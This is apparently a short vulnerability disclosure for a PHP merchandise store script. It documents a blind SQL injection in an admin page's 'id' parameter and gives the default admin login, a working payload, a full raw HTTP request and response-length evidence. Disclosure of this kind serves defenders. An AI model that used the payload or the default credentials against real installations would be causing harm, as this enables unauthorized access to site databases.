# Merchandise Online Store v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/14887/merchandise-online-store-php-free-source-code.html

Vulnerability File: /vloggers_merch/admin/?page=maintenance/manage_sub_category&id=

Vulnerability location: /vloggers_merch/admin/?page=maintenance/manage_sub_category&id=,id

[+] Payload: /vloggers_merch/admin/?page=maintenance/manage_sub_category&id=1%27%20and%20length(database())%20=17--+ // Leak place ---> id

Current database name: vloggers_merch_db,length is 17

```sql
GET /vloggers_merch/admin/?page=maintenance/manage_sub_category&id=1%27%20and%20length(database())%20=17--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=n23o4bgngdq5q3js6l0a0i6r6k
Connection: close
```

When length (database ()) = 16, Content-Length: 26820
![image](https://user-images.githubusercontent.com/54017627/166900094-f5fe73bf-be84-49fd-94e7-2752947b992c.png)

![image](https://user-images.githubusercontent.com/54017627/166899999-562f0104-15a4-4741-b564-8e9146f33f1e.png)

When length (database ()) = 17, Content-Length: 26866
![image](https://user-images.githubusercontent.com/54017627/166900031-b70fa810-f9c1-4609-bc4d-2e5715378950.png)

![image](https://user-images.githubusercontent.com/54017627/166899948-6321c062-a2ce-4052-ade7-1b1163b156d4.png)
